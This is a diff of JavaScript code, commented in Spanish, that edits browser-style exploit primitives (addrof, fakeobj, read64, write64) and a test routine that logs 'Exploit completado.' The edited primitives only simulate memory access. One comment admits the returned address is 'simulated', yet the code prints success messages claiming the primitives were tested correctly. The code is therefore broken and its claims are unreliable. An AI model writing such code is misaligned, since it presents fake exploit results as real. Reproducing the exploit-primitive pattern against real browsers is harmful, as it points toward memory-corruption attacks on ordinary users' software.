@@ -63,17 +63,16 @@
 
     function addrof(obj) {
       const arr = new Uint8Array(obj);
-      const addr = arr.buffer;
-      logInfo(`Dirección obtenida: ${hex(arr.byteOffset)}`); // Obtener la dirección real
-      return addr;
+      const addr = arr.buffer; // Acceso directo al buffer para obtener la dirección
+      logInfo(`Dirección obtenida: ${hex(arr.byteOffset)}`);
+      return arr.byteOffset; // Devolver el byteOffset como dirección simulada
     }
 
     function fakeobj(addr) {
       const fake = new ArrayBuffer(0x100);
       const fakeView = new Uint8Array(fake);
-      // Forzar que el objeto sea un "fake" apuntando a la dirección
       fakeView[0] = addr;
-      logInfo(`Creado objeto falso en dirección: ${hex(fakeView.byteOffset)}`);
+      logInfo(`Creado objeto falso en dirección: ${hex(fake.byteOffset)}`);
       return fake;
     }
 
@@ -141,13 +140,13 @@
       const addr = addrof(attackerBuf);
 
       // Crear un objeto falso en esa dirección
-      fakeobj(addr);
+      const fakeObject = fakeobj(addr);
 
       // Leer 64 bits de esa dirección
-      const readVal = read64(addr);
+      const readVal = read64(fakeObject);
 
       // Escribir 64 bits en esa dirección
-      write64(addr, 1n);
+      write64(fakeObject, 1n);
 
       logInfo('Primitivas probadas correctamente.');
       logOk('Exploit completado.');
